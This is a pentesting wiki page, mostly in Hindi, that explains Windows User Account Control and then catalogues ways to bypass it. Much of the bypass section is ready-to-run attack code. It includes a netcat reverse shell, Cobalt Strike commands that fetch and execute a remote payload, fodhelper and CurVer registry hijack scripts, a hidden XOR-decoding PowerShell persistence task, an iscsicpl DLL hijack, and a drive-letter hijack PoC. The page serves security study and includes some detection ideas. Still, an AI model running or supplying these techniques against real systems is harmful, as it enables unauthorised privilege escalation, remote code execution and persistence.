# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक feature है जो **elevated activities के लिए consent prompt** enable करता है। Applications के अलग-अलग `integrity` levels होते हैं, और **high level** वाला program ऐसे tasks कर सकता है जो **system को potentially compromise** कर सकते हैं। जब UAC enabled होता है, applications और tasks हमेशा **non-administrator account के security context** में run होते हैं, जब तक कि कोई administrator explicitly इन applications/tasks को system पर administrator-level access के साथ run करने की authorization न दे। यह एक convenience feature है जो administrators को unintended changes से बचाता है, लेकिन इसे security boundary नहीं माना जाता।

integrity levels के बारे में अधिक info के लिए:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

जब UAC लागू होता है, तो एक administrator user को 2 tokens दिए जाते हैं: एक standard user key, regular level पर regular actions करने के लिए, और एक admin privileges वाला।

यह [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) विस्तार से बताती है कि UAC कैसे काम करता है और इसमें logon process, user experience, और UAC architecture शामिल हैं। Administrators security policies का उपयोग करके यह configure कर सकते हैं कि UAC उनकी organization के local level पर कैसे काम करे (secpol.msc का उपयोग करके), या Active Directory domain environment में Group Policy Objects (GPO) के माध्यम से configure और push out किया जा सकता है। विभिन्न settings पर विस्तार से [यहाँ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) चर्चा की गई है। UAC के लिए 10 Group Policy settings set की जा सकती हैं। निम्न तालिका अतिरिक्त detail प्रदान करती है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**local security policies** ("secpol.msc" on most systems) डिफ़ॉल्ट रूप से इस तरह configured होती हैं कि वे **non-admin users को software installations करने से रोकें**। इसका मतलब है कि भले ही कोई non-admin user आपके software का installer डाउनलोड कर सके, वह उसे admin account के बिना run नहीं कर पाएगा।

### Registry Keys to Force UAC to Ask for Elevation

एक standard user के रूप में, जिसके पास admin rights नहीं हैं, आप सुनिश्चित कर सकते हैं कि जब "standard" account कुछ specific actions करने की कोशिश करे, तो UAC उसे **credentials के लिए prompt** करे। इसके लिए कुछ **registry keys** modify करनी होंगी, जिसके लिए आपको admin permissions चाहिए, जब तक कि कोई **UAC bypass** न हो, या attacker पहले से admin के रूप में logged in न हो।

भले ही user **Administrators** group में हो, ये changes user को administrative actions करने के लिए **अपनी account credentials दोबारा enter** करने के लिए मजबूर करती हैं।

**इस approach की एकमात्र कमी यह है कि इसके काम करने के लिए UAC disabled होना चाहिए, और production environments में ऐसा होना unlikely है।**

आपको जिन registry keys और entries को बदलना है, वे निम्न हैं (default values parentheses में):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

यह Local Security Policy tool के माध्यम से manually भी किया जा सकता है। एक बार बदलने के बाद, administrative operations user से credentials दोबारा enter करने के लिए prompt करेंगी।

### Note

**User Account Control एक security boundary नहीं है।** इसलिए, standard users अपने accounts से बाहर निकलकर local privilege escalation exploit के बिना administrator rights प्राप्त नहीं कर सकते।

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode low-integrity-level processes (like web browsers) को high-integrity-level data (like the temporary Internet files folder) तक पहुंचने से रोकने के लिए integrity checks का उपयोग करता है। यह browser को low-integrity token के साथ चलाकर किया जाता है। जब browser low-integrity zone में stored data तक पहुंचने की कोशिश करता है, तो operating system process के integrity level की जांच करता है और उसके अनुसार access देता है। यह feature remote code execution attacks को system पर sensitive data तक पहुंचने से रोकने में मदद करता है।
- जब कोई user Windows में log on करता है, system एक access token बनाता है जिसमें user के privileges की एक list होती है। Privileges, user rights और capabilities के combination के रूप में defined होते हैं। Token में user की credentials की भी एक list होती है, जो computer और network पर resources के लिए user को authenticate करने में उपयोग होने वाली credentials होती हैं।

### Autoadminlogon

Startup पर किसी specific user को automatically log on कराने के लिए, **`AutoAdminLogon` registry key** सेट करें। यह kiosk environments या testing purposes के लिए उपयोगी है। इसे केवल secure systems पर उपयोग करें, क्योंकि यह registry में password expose करता है।

Registry Editor या `reg add` का उपयोग करके निम्न keys सेट करें:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal logon behavior पर वापस जाने के लिए, `AutoAdminLogon` को 0 सेट करें।

## UAC bypass

> [!TIP]
> ध्यान दें कि अगर आपके पास victim तक graphical access है, तो UAC bypass सीधा है, क्योंकि UAC prompt दिखाई देने पर आप बस "Yes" पर click कर सकते हैं

UAC bypass निम्न स्थिति में needed है: **UAC activated है, आपका process medium integrity context में चल रहा है, और आपका user administrators group का member है**।

यह बताना महत्वपूर्ण है कि **यदि UAC highest security level (Always) पर है, तो उसे bypass करना अन्य levels (Default) की तुलना में काफी अधिक कठिन होता है।**

### UAC disabled

यदि UAC पहले से disabled है (`ConsentPromptBehaviorAdmin` **`0`** है), तो आप **admin privileges** (high integrity level) के साथ reverse shell execute कर सकते हैं, जैसे:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### token duplication के साथ UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

अगर आपके पास ऐसा user वाला shell है जो Administrators group के अंदर है, तो आप SMB (file system) के जरिए शेयर किए गए **C$** को local तौर पर नए disk में **mount** कर सकते हैं और आपके पास **file system के अंदर सब कुछ** access होगा (यहाँ तक कि Administrator home folder भी)।

> [!WARNING]
> **लगता है यह trick अब काम नहीं करती**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike के साथ UAC bypass

Cobalt Strike techniques केवल तभी काम करेंगी जब UAC को उसकी max security level पर set नहीं किया गया हो
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में भी **UAC** को **bypass** करने के लिए कई modules हैं।

### KRBUACBypass

Documentation और tool [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) में

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) जो कई UAC bypass exploits का **compilation** है। ध्यान दें कि आपको **visual studio या msbuild** का उपयोग करके **UACME compile** करना होगा। Compilation कई executables बनाएगा (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`) , आपको यह जानना होगा कि **आपको कौन-सा चाहिए।**\
आपको **सावधान** रहना चाहिए क्योंकि कुछ bypasses कुछ और programs **promtp** कर सकते हैं जो **user** को **alert** करेंगे कि कुछ हो रहा है।

UACME के पास **build version** है, जिससे पता चलता है कि कौन-सी technique कब से काम करना शुरू हुई। आप अपनी versions को affect करने वाली technique खोज सकते हैं:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC बायपास – fodhelper.exe (Registry hijack)

trusted binary `fodhelper.exe` modern Windows पर auto-elevated होता है। जब इसे लॉन्च किया जाता है, यह `DelegateExecute` verb को validate किए बिना नीचे दिए गए per-user registry path को query करता है। वहाँ command डालने से Medium Integrity process (user is in Administrators) UAC prompt के बिना High Integrity process spawn कर सकता है।

fodhelper द्वारा queried Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell चरण (अपना payload सेट करें, फिर trigger करें)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- Works when the current user is a member of Administrators and UAC level is default/lenient (not Always Notify with extra restrictions).
- Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
- Payload can be any command (PowerShell, cmd, or an EXE path). Avoid prompting UIs for stealth.

#### CurVer/extension hijack variant (HKCU only)

Recent samples abusing `fodhelper.exe` avoid `DelegateExecute` and instead **redirect the `ms-settings` ProgID** via the per-user `CurVer` value. The auto-elevated binary still resolves the handler under `HKCU`, so no admin token is needed to plant the keys:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Elevated होने के बाद, malware आमतौर पर `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` को `0` पर सेट करके **future prompts को disable** कर देता है, फिर अतिरिक्त defense evasion करता है (जैसे, `Add-MpPreference -ExclusionPath C:\ProgramData`) और high integrity पर चलने के लिए persistence को फिर से बनाता है। एक typical persistence task disk पर एक **XOR-encrypted PowerShell script** store करती है और हर घंटे उसे in-memory decode/execute करती है:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
यह variant अभी भी dropper को साफ कर देता है और केवल staged payloads छोड़ता है, जिससे detection को **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, या scheduled tasks जो in-memory में PowerShell decrypt करते हैं, की monitoring पर निर्भर होना पड़ता है।

#### More UAC bypass

**यहां उपयोग की गई सभी** techniques जो AUC को bypass करती हैं, **victim के साथ एक full interactive shell** की **require** करती हैं (एक सामान्य nc.exe shell पर्याप्त नहीं है)।

आप इसे **meterpreter** session के जरिए प्राप्त कर सकते हैं। ऐसे **process** पर migrate करें जिसका **Session** value **1** के बराबर हो:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

यदि आपके पास **GUI** का access है तो आप बस UAC prompt आने पर उसे accept कर सकते हैं; वास्तव में आपको bypass की जरूरत नहीं होती। इसलिए, GUI access मिलने से आप UAC को bypass कर पाएंगे।

इसके अलावा, यदि आपको किसी ऐसे व्यक्ति का GUI session मिलता है जो उसका उपयोग कर रहा था (संभावित रूप से RDP के जरिए), तो कुछ tools ऐसे होंगे जो administrator के रूप में चल रहे होंगे, जिनसे आप उदाहरण के लिए सीधे बिना UAC से फिर से prompt हुए **as admin** एक **cmd** चला सकते हैं, जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **stealthy** हो सकता है।

### Noisy brute-force UAC bypass

यदि आपको noisy होने की परवाह नहीं है, तो आप हमेशा [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जैसा कुछ **run** कर सकते हैं, जो तब तक permissions elevate करने के लिए **ask** करता रहता है जब तक user उसे accept नहीं कर देता।

### Your own bypass - Basic UAC bypass methodology

यदि आप **UACME** पर नजर डालें, तो आप देखेंगे कि **most UAC bypasses** एक **Dll Hijacking vulnerabilit**y का abuse करते हैं (मुख्यतः malicious dll को _C:\Windows\System32_ में लिखकर)। [यह पढ़ें ताकि आप जान सकें कि Dll Hijacking vulnerability कैसे खोजें](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. एक ऐसा binary खोजें जो **autoelevate** करता हो (जांचें कि जब यह execute होता है तो high integrity level पर चलता है)।
2. procmon के साथ "**NAME NOT FOUND**" events खोजें जो **DLL Hijacking** के लिए vulnerable हो सकते हैं।
3. आपको संभवतः DLL को कुछ **protected paths** (जैसे C:\Windows\System32) के अंदर **write** करना होगा, जहां आपके पास writing permissions नहीं हैं। आप इसे इन तरीकों से bypass कर सकते हैं:
1. **wusa.exe**: Windows 7,8 and 8.1. यह CAB file की content को protected paths के अंदर extract करने की अनुमति देता है (क्योंकि यह tool high integrity level से execute होता है)।
2. **IFileOperation**: Windows 10.
4. एक **script** तैयार करें जो आपकी DLL को protected path में copy करे और vulnerable तथा autoelevated binary को execute करे।

### Another UAC bypass technique

इसमें यह देखा जाता है कि क्या कोई **autoElevated binary** **registry** से किसी **binary** या **command** का **name/path** जिसे execute किया जाना है, **read** करने की कोशिश करता है (यह तब अधिक interesting होता है जब binary यह जानकारी **HKCU** के अंदर खोजता है)।

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` एक **auto-elevated** binary है जिसका abuse `iscsiexe.dll` को search order के जरिए load कराने के लिए किया जा सकता है। यदि आप एक malicious `iscsiexe.dll` को **user-writable** folder में रख सकते हैं और फिर current user का `PATH` (उदाहरण के लिए `HKCU\Environment\Path` के जरिए) modify कर सकते हैं ताकि वह folder search हो, तो Windows attacker DLL को elevated `iscsicpl.exe` process के अंदर **without showing a UAC prompt** load कर सकता है।

Practical notes:
- यह तब उपयोगी है जब current user **Administrators** में हो लेकिन UAC के कारण **Medium Integrity** पर चल रहा हो।
- इस bypass के लिए **SysWOW64** copy relevant है। **System32** copy को एक अलग binary मानें और behavior को independently validate करें।
- यह primitive **auto-elevation** और **DLL search-order hijacking** का संयोजन है, इसलिए अन्य UAC bypasses के लिए उपयोग किया गया वही ProcMon workflow missing DLL load को validate करने में उपयोगी होता है।

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `reg add` / registry writes to `HKCU\Environment\Path` के तुरंत बाद `C:\Windows\SysWOW64\iscsicpl.exe` का execution होने पर alert करें।
- `%TEMP%` या `%LOCALAPPDATA%\Microsoft\WindowsApps` जैसी **user-controlled** locations में `iscsiexe.dll` के लिए hunt करें।
- `iscsicpl.exe` launches को unexpected child processes या normal Windows directories के बाहर से आने वाले DLL loads के साथ correlate करें।

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps का उपयोग करता है। Directory को `SeGetTokenDeviceMap` first `\??` resolution पर lazily create करता है। अगर attacker shadow-admin token को केवल **SecurityIdentification** पर impersonate करता है, तो directory attacker को **owner** के रूप में create होती है ( `CREATOR OWNER` inherit करती है), जिससे drive-letter links बनाना संभव होता है जो `\GLOBAL??` पर precedence लेते हैं।

**Steps:**

1. Low-privileged session से, `RAiProcessRunOnce` call करें ताकि promptless shadow-admin `runonce.exe` spawn हो।
2. उसके primary token को एक **identification** token में duplicate करें और `\??` खोलते समय उसे impersonate करें ताकि attacker ownership के तहत `\Sessions\0\DosDevices/<LUID>` create हो जाए।
3. वहां attacker-controlled storage की ओर point करता हुआ `C:` symlink create करें; उस session में बाद के filesystem accesses में `C:` attacker path पर resolve होगा, जिससे बिना prompt के DLL/file hijack संभव हो जाता है।

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
